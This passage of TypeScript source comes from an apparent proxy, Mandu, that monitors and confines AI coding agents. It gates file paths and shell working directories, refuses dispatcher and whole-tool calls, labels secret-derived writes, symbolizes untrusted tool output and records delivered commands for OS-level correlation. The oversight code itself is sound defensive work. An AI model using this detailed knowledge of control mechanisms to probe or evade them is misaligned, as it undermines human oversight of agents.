          ...this.relativeBaseFor(surface),
        });
        if (gate && gate.gated.length > 0) {
          cur = gate.input;
          changed = true;
          // A SHELL whose working directory was denied (exec.workdir,
          // bash.workdir) does not run at all: OpenClaw falls back to its own
          // cwd, or the home directory, when the workdir does not exist, so
          // the sentinel path alone would still run the command.
          const cmdField = Object.prototype.hasOwnProperty.call(surface.exec, name) ? surface.exec[name]! : undefined;
          if (cmdField && typeof (cur as Record<string, unknown>)[cmdField] === "string") {
            const why = `working directory denied: ${gate.gated[0]!.reason}`;
            cur = { ...(cur as Record<string, unknown>), [cmdField]: blockSentinelCommand(why) };
            this.log(`fs-gate: ${name}.${cmdField} blocked (${why})`);
            // The shell runs the exec sentinel: its notice is the exec gate's.
            this.execGateNotices.remember(toolUseId, blockNoticeText(why));
            shellBlocked = true;
          }
          for (const g of gate.gated) {
            denials.push({ field: g.field, path: g.path, reason: g.reason });
            if (emit) {
              this.safeEmit(
                makeFsGate({
                  ctx: emit.ctx,
                  callId: toolUseId,
                  tool: g.tool,
                  field: g.field,
                  path: g.path,
                  sentinel: g.sentinel,
                  reason: g.reason,
                  requiresApproval: g.decision ? g.decision.allow === false && g.decision.requiresApproval : true,
                  ruleRef: g.ruleRef,
                  ...(g.approvalId ? { approvalId: g.approvalId } : {}),
                }),
              );
            }
          }
        }
      }
      // 1.5 THE DERIVED ON-DISK LABEL (Plan 9, §4/§8). A write from a HIGH session
      //     may carry secret-derived bytes, and the watermark that confines them
      //     is SESSION state — it dies with the process, and the next session
      //     reads the file back as PUBLIC. So the arbiter records the level on the
      //     path, BEFORE the bytes land. Runs on the HumanView spelling (labels
      //     are keyed there), after the fs gate (a denied path is not labeled) and
      //     WITHOUT a view-map prerequisite — the watermark's fs chokepoint must
      //     be live at the default posture, or it is not a chokepoint at all.
      {
        const lbl = await labelWrittenPaths(name, cur, {
          arbiter: this.arbiter,
          sessionKey: gateSession,
          ...(viewMap ? { viewMap } : {}),
          log: this.log,
          pathTools: surface.paths,
          ...this.relativeBaseFor(surface),
        });
        if (lbl && lbl.writes.length > 0) {
          if (lbl.input !== cur) {
            cur = lbl.input; // a fail-closed deny rewrote a field to the sentinel
            changed = true;
          }
          for (const w of lbl.writes) {
            if (w.sentinel) denials.push({ field: w.field, path: w.path, reason: w.reason });
            if (emit) {
              this.safeEmit(
                makeFsLabel({
                  ctx: emit.ctx,
                  callId: toolUseId,
                  tool: w.tool,
                  field: w.field,
                  path: w.path,
                  level: w.level,
                  reason: w.reason,
                  ...(w.sentinel ? { sentinel: w.sentinel } : {}),
                }),
              );
            }
          }
        }
      }
      // Every path of the call denied (and not a shell, whose sentinel
      // command carries the exec notice): the model reads Mandu's notice in
      // place of the tool's error, no byte of which is forwarded.
      if (denials.length > 0 && !shellBlocked && everyPathDenied(cur, Object.prototype.hasOwnProperty.call(surface.paths, name) ? surface.paths[name] : undefined)) {
        this.resultNotices.remember(toolUseId, pathDenialNotice(name, denials));
      }
      if (!viewMap) return changed ? { input: cur, changed: true } : null;
      // 2. Forward-map the allowed fields to their AgentView spelling. Denied
      //    fields are now sentinels under no root, so the map leaves them be.
      const fwd = viewMap.rewriteToolUseInput(name, cur, "forward", surface);
      if (fwd?.changed) {
        // Record each forward application (HumanView→AgentView spelling on the
        // response wire): the model asked for the HumanView path; the agent
        // executes the AgentView twin. Observability only, per changed field.
        if (emit) {
          const before = cur as Record<string, unknown>;
          // a patch's rewritten text is not one path (its header paths moved)
          const patchField = surface.patch && Object.prototype.hasOwnProperty.call(surface.patch, name) ? surface.patch[name]!.field : undefined;
          for (const [field, after] of Object.entries(fwd.input)) {
            const prev = before[field];
            if (field !== patchField && typeof prev === "string" && typeof after === "string" && prev !== after) {
              this.safeEmit(
                makePathRewrite({
                  ctx: emit.ctx, callId: toolUseId || null, tool: name, field,
                  direction: "forward", human: prev, agent: after,
                }),
              );
            }
          }
        }
        cur = fwd.input;
        changed = true;
      }
      return changed ? { input: cur, changed: true } : null;
    };
    const gateCall: ToolInputTransform = async (name, input, toolUseId) => {
      // The session agent's tool names (gate-surface.ts; cached per session,
      // the union of every agent's table on any failure). Same identity as classify.
      const surface = await this.gateSurfaces.get(this.sessionKey);
      // A dispatcher (OpenClaw's `tool_call{id, args}`, supported-agents.md
      // §2.1) runs another tool: every gate reads the INNER tool, and a call
      // that does not parse to exactly one inner tool (or a code-running
      // dispatcher) is refused on the wire. Fail-closed by construction: the
      // model's input never goes out unchanged unless it was gated as the
      // tool that runs.
      const d = unwrapDispatch(name, input, surface);
      if (d.kind === "refuse") {
        this.log(`dispatch: refused ${d.dispatcher} (${toolUseId || "no id"}): ${d.reason}`);
        if (emit) {
          this.safeEmit(
            makeExecGate({
              ctx: emit.ctx,
              callId: toolUseId,
              tool: d.dispatcher,
              field: Object.keys(d.input)[0] ?? "input",
              decision: "block",
              reason: `dispatcher call refused: ${d.reason}`,
              symbols: [],
              evasion: [],
              shell: "AgentShell",
              sentinel: JSON.stringify(d.input),
              ruleRef: { source: "fail-closed", id: "dispatch:refused" },
            }),
          );
        }
        this.resultNotices.remember(toolUseId, refusalNotice(d.reason));
        return { input: d.input, changed: true };
      }
      if (d.kind === "call") {
        const r = await gateOne(d.name, d.input, toolUseId, surface, (inner) => d.rewrap(inner as Record<string, unknown>));
        // A gate that refuses the inner tool (a refused form, a blocked stdin
        // write) refuses the dispatcher call: `tool_call` resolves no tool
        // named "mandu-refused: <why>", whatever the inner schema accepts.
        if (r?.refused !== undefined) {
          this.resultNotices.remember(toolUseId, refusalNotice(r.refused));
          return { input: dispatcherRefusalInput(r.refused), changed: true };
        }
        return r?.changed ? { input: d.rewrap(r.input as Record<string, unknown>), changed: true } : null;
      }
      // A tool refused outright (gate-surface refuse table: its effect lands
      // outside every chokepoint, e.g. OpenClaw's `terminal` or `automations`).
      // Its input becomes one the tool's schema rejects; nothing runs.
      const refused = refusedTool(name, surface);
      if (refused !== null) {
        const out = refusedToolInput(refused);
        this.log(`refuse: ${name} (${toolUseId || "no id"}): ${refused}`);
        if (emit) {
          this.safeEmit(
            makeExecGate({
              ctx: emit.ctx,
              callId: toolUseId,
              tool: name,
              field: "action",
              decision: "block",
              reason: `tool refused: ${refused}`,
              symbols: [],
              evasion: [],
              shell: "AgentShell",
              sentinel: JSON.stringify(out),
              ruleRef: { source: "fail-closed", id: "tool:refused" },
            }),
          );
        }
        this.resultNotices.remember(toolUseId, refusalNotice(refused));
        return { input: out, changed: true };
      }
      const r = await gateOne(name, input, toolUseId, surface, (x) => x);
      // A call refused whole (its input one the tool rejects): nothing runs,
      // and the model reads why in place of the tool's validation error.
      if (r?.refused !== undefined) this.resultNotices.remember(toolUseId, refusalNotice(r.refused));
      return r ? { input: r.input, changed: r.changed } : null;
    };
    // Plan 13 D9 follow-up: after every gate, record the command the agent
    // is about to receive, by the call's id, on the human plane, BEFORE the
    // call is relayed. The arbiter binds the call to the agent's shell by
    // this text (the view map's AgentView spelling, a block sentinel
    // included), never by the input the agent echoes back next turn.
    return async (name, input, toolUseId) => {
      // THE WINDOW (upload-gate.ts, unmapped-upload.ts): the first earlier
      // call of this response (one model turn; the agent runs its calls in
      // order) that may write files. A later upload's file is judged now but
      // read after that call ran, so the upload legs refuse it.
      const surface = await this.gateSurfaces.get(this.sessionKey);
      turn.priorWriter = turn.calls.find((n) => possibleWriter(n, surface));
      let out: Awaited<ReturnType<ToolInputTransform>>;
      try {
        out = await gateCall(name, input, toolUseId);
      } finally {
        turn.calls.push(name);
      }
      await this.recordDeliveredCommand(name, out ? out.input : input, toolUseId, gateSession);
      return out;
    };
  }

  /** The D9 follow-up's record (see toolInputTransform). Never throws and
   *  never changes the call: a failed record leaves the call bound by its
   *  execGate record alone, and a call bound by nothing is masked while the
   *  session holds a raw read (fail-closed). The command is read as the
   *  exec-output legs read it (`callCommandText`, the dispatcher's inner
   *  tool), from the input the agent receives. */
  private async recordDeliveredCommand(name: string, delivered: unknown, toolUseId: string, sessionKey: string | undefined): Promise<void> {
    if (!toolUseId || !this.arbiter.recordCallCommand) return;
    try {
      const surface = await this.gateSurfaces.get(this.sessionKey);
      const d = unwrapDispatch(name, delivered, surface);
      if (d.kind === "refuse") return;
      const tool = d.kind === "call" ? d.name : name;
      const inner = d.kind === "call" ? d.input : delivered;
      if (inner === null || typeof inner !== "object" || Array.isArray(inner)) return;
      // Plan 13 §4.5.1 (2026-10-02): a call with no command (WebFetch, an
      // MCP tool) is recorded too, without one: its relay time starts the
      // window in which the agent's own connections to a holder mask its
      // result (agentReceiptTaint). A call whose relay is not recorded is
      // masked by every such connection before its result (fail-closed).
      const command = callCommandText(tool, inner as Record<string, unknown>, surface);
      const ms = DELIVERED_COMMAND_TIMEOUT_MS;
      let timer: NodeJS.Timeout | undefined;
      await Promise.race([
        this.arbiter.recordCallCommand({ callId: toolUseId, ...(command !== null ? { command } : {}), ...(sessionKey ? { sessionKey } : {}) }),
        new Promise<never>((_, reject) => { timer = setTimeout(() => reject(new Error(`timed out after ${ms}ms`)), ms); }),
      ]).finally(() => clearTimeout(timer));
    } catch (err) {
      this.log(`recordCallCommand failed for ${toolUseId}: ${(err as Error).message} (its result is masked while the session holds a raw read)`);
    }
  }

  /**
   * SSE path: relay the stream while sniffing tool_use; record + emit. With an
   * active view map the stream first runs through the tool_use rewriter
   * (HumanView→AgentView on registered path fields, one re-emitted delta per
   * block — fs-sync.md §1.3 rule 5); the sniffer taps the REWRITTEN
   * stream, so recordToolCall + events carry what the agent actually received
   * (the form the OS interceptors will correlate against). No view map → the
   * bytes pass through verbatim exactly as before.
   */
  private async streamAndSniffSse(src: Readable, res: ServerResponse, sessionKey: string, emit?: EmitState, upstreamStatus?: number): Promise<void> {
    const recorded: Array<Promise<void>> = [];
    const seen: ReconstructedToolUse[] = [];
    const parser = new SseToolUseParser((tu) => {
      recorded.push(this.recordToolUse(tu.id, tu.name, tu.input));
      seen.push(tu);
      if (emit) {
        this.safeEmit(makeToolUse({ ctx: emit.ctx, callId: tu.id, name: tu.name, input: tu.input }));
      }
    });
    const transform = this.toolInputTransform(sessionKey, emit);
    const rewriter = transform ? new SseToolUseRewriter(transform) : null;
    // Text-delta token repacker (unconditional — the split hazard is
    // independent of view maps): a `$MDU:` token straddling two deltas is
    // re-segmented so the agent receives it WHOLE in one delta; text content
    // is byte-identical, only segmentation changes (sse-text-repack.ts).
    // Chained AFTER the rewriter so it sees normalized SSE framing; pure
    // string work, never throws, never awaits.
    const repacker = new SseTextDeltaRepacker();
    // Reply row reservation (reply-row-reservation.md §3.5): chained AFTER
    // the repacker (a token arrives whole) and AFTER the sniffer's tap, so
    // the parser, assistantText() and the tllm_call event record the model's
    // real text, never a reserve block. Only built when expansion can fire
    // (kill switch off, a session key, an arbiter with the ops); otherwise
    // the stream is exactly as before.
    const expander = this.reserve.possible
      ? new SseReserveExpander({
          lines: this.reserve.lines,
          layout: this.reserve.layout,
          shape: this.reserve.shape,
          register: this.reserve.register,
          cap: this.reserveCap,
          // Claude Code renders one row per backticked row (§12 probe).
          codeSpan: true,
          onExpand: (x) => {
            if (emit) {
              this.safeEmit(makeReserveExpand(emit.ctx, {
                hash: x.hash, rows: x.rows, token: x.token,
                ...(x.width !== undefined && x.first !== undefined ? { width: x.width, first: x.first } : {}),
              }));
            }
          },
        })
      : null;
    // The reply-media gate (reply-media.ts): in a session whose agent
    // attaches the files a `MEDIA:` line of its reply names (OpenClaw), the
    // text is read for directives AFTER the sniffer's tap (the tllm_call
    // event keeps the model's own words) and BEFORE the reserve expander.
    // Resolved inside the relay chain (each link awaits it), so the
    // stream's listeners are attached at once and no upstream error goes
    // unheard.
    let media: ReplyMediaFilter | null = null;
    const mediaReady = this.replyMediaFor(sessionKey, emit).then((o) => {
      media = o ? new ReplyMediaFilter(ANTHROPIC_WIRE, o) : null;
    });
    src.setEncoding("utf8");
    // Rewriter feeds are ASYNC (the P3 gate awaits an arbiter verdict at block
    // boundaries), so chunk processing is chained to preserve output order.
    // The chain itself never rejects (each link catches), and the gate's
    // arbiter await is BOUNDED by DEFAULT_GATE_TIMEOUT_MS (fs-gate.ts) — a
    // wedged arbiter fails closed to a denied sentinel — so a slow/failed link
    // can only bounded-delay then deny, never wedge the relay indefinitely.
    let chain: Promise<void> = Promise.resolve();
    const enqueue = (fn: () => Promise<void> | void): void => {
      chain = chain.then(fn, fn as () => void);
    };
    src.on("data", (chunk: string) => {
      enqueue(async () => {
        // Rewrite (if mapped) and repack, sniff that (the tool_use calls the
        // agent receives, the model's own text), then expand reserve blocks
        // (text only; tool_use untouched) and relay.
        let out = chunk;
        if (rewriter) {
          try {
            out = await rewriter.feed(chunk);
          } catch (err) {
            // Fail-safe: relay the raw chunk; the rewrite is view-consistency,
            // not the symbolization boundary (backstop still applies next turn).
            // (The P3 gate itself never throws — a denied/unreachable verdict is
            // enforced INSIDE the transform as a denied-sentinel.)
            this.log(`sse rewrite error (non-fatal, relaying raw): ${(err as Error).message}`);
            out = chunk;
          }
          if (out === "") return; // block buffered; bytes follow on a later chunk
        }
        out = repacker.feed(out);
        if (out === "") return; // suffix held; bytes follow on a later chunk
        // Sniff the model's own text BEFORE the reserve expander.
        try {
          parser.feed(out);
        } catch (err) {
          this.log(`sse sniff error (non-fatal): ${(err as Error).message}`);
        }
        await mediaReady;
        const m = media as ReplyMediaFilter | null;
        if (m) {
          out = m.feed(out);
          if (out === "") return; // a line start, or the rest of a reply with a directive, held
        }
        if (expander) out = await expander.feed(out);
        if (out !== "") res.write(out);
      });
    });
    await new Promise<void>((resolve) => {
      src.on("end", () => {
        enqueue(async () => {
          let tail = "";
          if (rewriter) {
            try {
              tail = await rewriter.end();
            } catch (err) {
              this.log(`sse rewrite flush error (non-fatal): ${(err as Error).message}`);
            }
          }
          tail = repacker.feed(tail) + repacker.end(); // drain held suffixes
          if (tail !== "") { try { parser.feed(tail); } catch { /* non-fatal */ } }
          await mediaReady;
          const m = media as ReplyMediaFilter | null;
          if (m) tail = m.feed(tail) + (await m.end());
          if (expander) tail = (await expander.feed(tail)) + expander.end();
          if (tail !== "") res.write(tail);
          try { parser.end(); } catch { /* non-fatal */ }
          // Register the tllm_call emit BEFORE ending the response so it is in
          // pendingEmits the instant the client observes the stream complete
          // (close() can then deterministically drain it). All tool_use names are
          // known here (parser.end() flushed any open block). Best-effort.
          if (emit) this.emitTllmCall(emit, seen, parser.assistantText(), { status: upstreamStatus });
          res.end();
          resolve();
        });
      });
      src.on("error", (err) => {
        enqueue(async () => {
          this.log(`upstream stream error: ${err.message}`);
          // Release anything the rewriter/repacker still hold — never swallow
          // bytes. Feed the flushed tail to the sniffer too (as the end path
          // does), so any tool_use released here is recorded + emitted;
          // otherwise the agent would execute a tool the OS interceptors have
          // no record of.
          let tail = "";
          if (rewriter) {
            try {
              tail = await rewriter.end();
            } catch (e) {
              this.log(`sse rewrite flush error on upstream error (non-fatal): ${(e as Error).message}`);
            }
          }
          tail = repacker.feed(tail) + repacker.end();
          if (tail !== "") { try { parser.feed(tail); } catch { /* non-fatal */ } }
          await mediaReady;
          const m = media as ReplyMediaFilter | null;
          if (m) tail = m.feed(tail) + (await m.end());
          if (expander) tail = (await expander.feed(tail)) + expander.end();
          if (tail !== "") res.write(tail);
          try { parser.end(); } catch { /* non-fatal */ }
          if (emit) this.emitTllmCall(emit, seen, parser.assistantText(), { status: upstreamStatus });
          res.end();
          resolve();
        });
      });
    });
    await Promise.allSettled(recorded);
  }

  /**
   * Non-streaming path: buffer the JSON, forward it, sniff tool_use; record +
   * emit. With an active view map, tool_use path args are forward-mapped in the
   * buffered object BEFORE relay + sniff (the JSON twin of the SSE rewriter);
   * an unparseable body relays raw, unrewritten (conservative rule 3).
   */
  private async bufferAndSniffJson(src: Readable, res: ServerResponse, sessionKey: string, emit?: EmitState, upstreamStatus?: number): Promise<void> {
    const chunks: Buffer[] = [];
    await new Promise<void>((resolve) => {
      src.on("data", (c: Buffer) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
      src.on("end", resolve);
      src.on("error", () => resolve());
    });
    let buf = Buffer.concat(chunks);
    // Sniff a parsed copy for tool_use decisions (synchronous parse).
    let tus: ReconstructedToolUse[] = [];
    let assistantText = "";
    let upstreamError: string | undefined;
    try {
      const obj = JSON.parse(buf.toString("utf8")) as Record<string, unknown>;
      // Forward map + P3 gate over the buffered tool_use blocks (the JSON twin
      // of the SSE rewriter path).
      const transform = this.toolInputTransform(sessionKey, emit);
      const content = obj["content"];
      if (transform && Array.isArray(content)) {
        let changed = false;
        for (const b of content) {
          if (!isToolUseBlock(b)) continue;
          const r = await transform(b.name, b.input, b.id ?? "");
          if (r?.changed) {
            b.input = r.input;
            changed = true;
          }
        }
        if (changed) buf = Buffer.from(JSON.stringify(obj), "utf8");
      }
      // The reply-media gate over the answer's text blocks (reply-media.ts).
      if (upstreamStatus === undefined || upstreamStatus < 400) {
        const mediaOpts = await this.replyMediaFor(sessionKey, emit);
        if (mediaOpts && (await gateMessagesJsonReply(obj, mediaOpts))) buf = Buffer.from(JSON.stringify(obj), "utf8");
      }
      tus = extractToolUsesFromJson(obj);
      assistantText = extractAssistantText(obj);
      if (upstreamStatus !== undefined && upstreamStatus >= 400) {
        upstreamError = extractAnthropicError(obj) ?? undefined;
      }
    } catch (err) {
      this.log(`json sniff error (non-fatal): ${(err as Error).message}`);
    }
    // Register the best-effort emits BEFORE ending the response, so they are in
    // pendingEmits the instant the client observes completion (deterministic
    // close()-drain). Off the security path — the bytes pass through unchanged.
    if (emit) {
      for (const t of tus) {
        this.safeEmit(makeToolUse({ ctx: emit.ctx, callId: t.id, name: t.name, input: t.input }));
      }
      this.emitTllmCall(emit, tus, assistantText, { status: upstreamStatus, error: upstreamError });
    }
    // Pass the bytes through unchanged.
    res.end(buf);
    // Record tool_use for OS-interceptor correlation (non-fatal, separate path).
    await Promise.allSettled(tus.map((t) => this.recordToolUse(t.id, t.name, t.input)));
  }

  /**
   * Emit the `tllm_call` event for one exchange: model, a DualRepr of the
   * forwarded (symbolized) prompt summary, output = assistant text + the
   * tool_use names parsed from the response, and the §9 invariant flag
   * (whether any un-symbolized untrusted span survived in the forwarded prompt).
   * Best-effort. Built from data already gathered on the privileged side; the
   * raw `original` never leaves the arbiter boundary.
   */
  private emitTllmCall(
    emit: EmitState,
    tools: ReconstructedToolUse[],
    assistantText: string,
    upstream?: { status?: number; error?: string },
  ): void {
    // The symbols that landed in the forwarded prompt, for the input DualRepr.
    const inputSymbols: SymbolRef[] = [];
    const haystack = oracleHaystack(emit.rewritten.request, emit.rewritten.rewrites);
    let survivor: string | null = null;
    for (const r of emit.rewritten.rewrites) {
      if (r.symbolized && r.symbol) {
        // Split results (trailing <system-reminder> tail off a TRUSTED body):
        // only the tail was replaced by the symbol; the body survives BY DESIGN.
        // A value-only release: each replaced value's own symbol.
        if (r.valueOnly) for (const v of r.valueOnly) inputSymbols.push(symbolRef(v.symbol, r.tool, v.value, r.origin ?? null));
        else inputSymbols.push(symbolRef(r.symbol, r.tool, r.symbolValue ?? r.symbolizedSpan ?? r.value, r.origin ?? null));
        survivor ??= survivingResult(ownForwardedText(r), haystack, mustNotSurvive(r), crossResultSpans(r));
      }
    }
    // §9 oracle, scoped to the UNTRUSTED spans: check the forwarded tool_result
    // blocks (post-symbolization → symbol tokens), NOT the whole prompt. A raw value
    // that ALSO appears in TRUSTED content (the user prompt, or the agent's own
    // command/argv) is not a leak; only a tool_result whose bytes survived
    // symbolization is. Fixes the false VIOLATED on benign sessions whose tool output
    // equals a trusted literal (e.g. the agent running `echo mandu-live-ok`).
    // Per result, a short span counts only inside its own block (survivingResult).

    // Echo each tool call as `→ name(args)` — the SAME shape the input transcript
    // uses for assistant tool_use blocks (flattenMessageContent) — so the dashboard's
    // main pane shows WHAT the model asked the tool to do (the command, the path, the
    // symbol it forwarded), not just the bare tool name. The args are the symbolized
    // request, so any `$MDU:*` survive intact.
    const toolCalls = tools
      .filter((t) => t.name !== "")
      .map((t) => {
        let args: string;
        try {
          args = JSON.stringify(t.input ?? {});
        } catch {
          args = "{…}";
        }
        return `→ ${t.name}(${args})`;
      });
    let outputText = [assistantText, ...toolCalls].filter((s) => s).join("\n");
    // No model output because the upstream returned an error (e.g. a 429
    // rate-limit / 529 overloaded relayed after the retry cap). Surface it on the
    // event so the dashboard EXPLAINS the blank instead of hiding it as a silent
    // empty turn (off the security path — the bytes already passed through).
    if (!outputText && upstream?.status !== undefined && upstream.status >= 400) {
      const reason =
        upstream.status === 429 ? "rate-limited" : upstream.status === 529 ? "overloaded" : "error";
      outputText = `⚠ no model response — upstream HTTP ${upstream.status} (${reason})${
        upstream.error ? `: ${upstream.error}` : ""
      }`;
    }

    this.safeEmit(
      makeTllmCall({
        ctx: emit.ctx,
        model: emit.model,
        inputSymbolized: truncate(summarizeRequest(emit.rewritten.request), PROMPT_SUMMARY_CAP),
        // We do not reconstruct the full pre-symbolization prompt (it never
        // existed as one string); the per-result events carry the originals.
        inputOriginal: null,
        inputSymbols,
        // The COMPLETE, untruncated structured input (each block source-tagged),
        // built from the SAME symbolized request — the dashboard's "Show full
        // input" reveals it and highlights the mandu-injected block.
        fullInput: buildFullInput(emit.rewritten.request),
        // Structural request shape — the side-call detection seam (dashboard.md
        // §4.2c). Computed HERE, the single funnel for every tllm_call (SSE end,
        // SSE error, JSON, relayed 4xx/429), so an errored turn still carries it.
        callShape: requestCallShape(emit.rewritten.request),
        outputText,
        violatedInvariant: survivor !== null,
        invariantDetail: survivor
          ? `un-symbolized untrusted span survived in forwarded prompt: ${truncate(survivor, 120)}`
          : undefined,
      }),
    );
  }

  private async recordToolUse(id: string, name: string, input: unknown): Promise<void> {
    if (!id || !name) return;
    try {
      await this.arbiter.recordToolCall({ toolUseId: id, name, input, sessionKey: this.sessionKey });
    } catch (err) {
      // Non-fatal: recording is for OS-interceptor correlation, not the
      // symbolization invariant. The bytes already reached the client unchanged.
      this.log(`recordToolCall failed (non-fatal): ${(err as Error).message}`);
    }
  }

  // ── header / response helpers ─────────────────────────────────────────────

  /** What restoreAgentKey has logged (header, host, outcome), so each line
   *  is printed once, not per request. */
  private readonly agentKeyLogged = new Set<string>();

  /**
   * Agent-sign-in.md §3: the agent's own key, put back into `fwdHeaders` (an
   * `x-api-key` or `Bearer` header whose whole value is a placeholder) when
   * the egress gate releases that placeholder at `upstream`'s host. Every
   * other header, the body and every failure are left as they are: the
   * provider answers 401 (auth-substitution.ts). Never logs a value.
   */
  private async restoreAgentKey(fwdHeaders: Record<string, string | string[] | undefined>, upstream: string | undefined): Promise<void> {
    if (upstream === undefined) return;
    const arbiter = this.arbiter;
    const source = arbiter.authCredential ? { authCredential: arbiter.authCredential.bind(arbiter) } : undefined;
    const dest = upstreamDestination(upstream);
    const subs = await substituteAuthHeaders(fwdHeaders, dest, source, this.sessionKey);
    for (const s of subs) {
      const key = `${s.header}\u0000${dest?.host ?? ""}\u0000${s.symbol}\u0000${s.restored}`;
      if (this.agentKeyLogged.has(key)) continue;
      this.agentKeyLogged.add(key);
      this.log(s.restored
        ? `agent key: put the key back in ${s.header} for ${dest?.host} (agent-sign-in.md §3)`
        : `agent key: ${s.header} keeps its placeholder for ${dest?.host ?? "an unknown host"} (${s.reason}); the provider will refuse it`);
    }
  }

  private sanitizeHeaders(
    headers: IncomingMessage["headers"],
    contentLength: number,
  ): Record<string, string | string[] | undefined> {
    const out: Record<string, string | string[] | undefined> = {};
    for (const [k, v] of Object.entries(headers)) {
      const lk = k.toLowerCase();
      // Drop hop-by-hop + length/encoding headers; we set our own length and
      // do not re-encode bodies.
      if (lk === "host" || lk === "content-length" || lk === "connection" ||
          lk === "transfer-encoding" || lk === "accept-encoding") continue;
      // Mandu's own headers (x-mandu-session-id, -batch-id, -tenant) are read
      // here and stay here: the model provider has no use for them, and they
      // name the user's session, batch and tenant (2026-09-29).
      if (lk.startsWith("x-mandu-")) continue;
      out[k] = v;
    }
    out["content-length"] = String(contentLength);
    // We forward an identity body; refuse compressed upstream responses so the
    // SSE/JSON sniffer sees plaintext (and the client gets identical bytes).
    out["accept-encoding"] = "identity";
    return out;
  }

  private responseHeaders(
    headers: Record<string, string | string[] | undefined>,
    opts: { dropContentLength?: boolean } = {},
  ): Record<string, string | string[]> {
    const out: Record<string, string | string[]> = {};
    for (const [k, v] of Object.entries(headers)) {
      if (v == null) continue;
      const lk = k.toLowerCase();
      if (lk === "connection" || lk === "transfer-encoding") continue;
      // The view-map rewrite can change the body length; chunked relay instead.
      if (opts.dropContentLength && lk === "content-length") continue;
      out[k] = v;
    }
    return out;
  }

  /**
   * Serve the identity document for the launcher's reuse check. `{mandu:true}`
   * plus the configured identity when set, else `{mandu:false}` (an
   * unidentified proxy a launcher must not adopt). Loopback admin — never
   * carries secrets (the arbiter socket path + workspace roots are already in
   * the launcher's own env).
   */
  private serveIdentity(res: ServerResponse): void {
    const body = this.identity
      ? { mandu: true, ...this.identity }
      : { mandu: false };
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify(body));
  }

  private refuse(res: ServerResponse, status: number, message: string): void {
    if (res.headersSent) return;
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: { type: "mandu_fail_closed", message } }));
  }

  /** An Anthropic-shaped request error (`{"type":"error","error":{"type":
   *  "invalid_request_error",…}}`), the shape Claude Code prints as
   *  "API Error: 400 …" without retrying. */
  private refuseRequest(res: ServerResponse, status: number, message: string): void {
    if (res.headersSent) return;
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify({ type: "error", error: { type: "invalid_request_error", message } }));
  }

  private finished(res: ServerResponse): Promise<void> {
    return new Promise((resolve) => {
      if (res.writableEnded) return resolve();
      res.on("finish", resolve);
      res.on("close", resolve);
    });
  }

  /**
   * Forward upstream with bounded retry on transient throttles (429/529). The
   * request body is already buffered, so a retry re-sends identical bytes; those
   * statuses mean the request was rejected before processing, so retrying a POST
   * is safe. The discarded throttle response body is drained to free the socket.
   * After `maxAttempts` the last response is returned and relayed UNCHANGED — we
   * never mask a persistent throttle, the agent still sees the real 429/529.
   */
  private async upstreamWithRetry(args: Parameters<UpstreamFetcher>[0], fetcher: UpstreamFetcher = this.upstream): Promise<UpstreamResponse> {
    for (let attempt = 1; ; attempt++) {
      const resp = await fetcher(args);
      if (!RETRYABLE_STATUS.has(resp.status) || attempt >= this.retry.maxAttempts) {
        return resp;
      }
      // Drain + discard the throttle body so the underlying connection is freed.
      resp.body.on("error", () => {});
      resp.body.resume();
      const delay = retryDelayMs(resp.headers, attempt, this.retry);
      this.log(`upstream ${resp.status} (attempt ${attempt}/${this.retry.maxAttempts}); retrying in ${delay}ms`);
      await this.sleep(delay);
    }
  }

  /** The default upstream fetcher: a real HTTPS request to the origin, or
   *  plain HTTP when the origin is an `http:` LITERAL LOOPBACK address
   *  (upstreamTransport: the offline demo's stand-in model, mandu-demo.md
   *  §4). Any other origin is refused per request (→ 502), never sent. */
  private makeHttpsFetcher(origin: string, tlsMaterial?: TlsMaterial): UpstreamFetcher {
    const url = new URL(origin);
    const transport = upstreamTransport(url);
    // Plan 12 D3: a declared main model's checks run in every handshake, on
    // an agent of their own (so no connection is shared with another origin).
    const agentP = tlsMaterial && transport === "https"
      ? import("node:https").then((h) => new h.Agent({ keepAlive: true, ...tlsOptions(tlsMaterial) } as import("node:https").AgentOptions))
      : null;
    // A base path on the upstream (a declared model served under a prefix,
    // e.g. http://127.0.0.1:4000/anthropic; plan 11 phase 3) prefixes every
    // request path, as the agent itself would have done with that base URL.
    const basePath = upstreamBasePath(url);
    return async ({ method, path, headers, body }) => {
      if (transport === "refuse") {
        throw new Error(`upstream ${url.protocol}//${url.host} refused: plain http is allowed only to a loopback address (127.0.0.0/8, ::1); use https`);
      }
      // Plan 12 D4: a literal address is never looked up, so the agent's
      // perimeter lookup cannot see it; check it here, before any connection.
      const outside = tlsMaterial ? checkLiteralHost(url.hostname, tlsMaterial.perimeter) : null;
      if (outside) throw outside;
      const https = transport === "http" ? await import("node:http") : await import("node:https");
      const agent = agentP ? await agentP : undefined;
      return new Promise<UpstreamResponse>((resolve, reject) => {
        const r = https.request(
          {
            protocol: url.protocol,
            hostname: url.hostname.replace(/^\[|\]$/g, ""),
            port: url.port || (transport === "http" ? 80 : 443),
            ...(agent ? { agent } : {}),
            method,
            path: basePath + path,
            headers: { ...headers, host: url.host },
          },
          (upRes) => {
            resolve({
              status: upRes.statusCode ?? 502,
              headers: upRes.headers,
              body: upRes,
            });
          },
        );
        r.on("error", reject);
        r.end(body);
      });
    };
  }
}
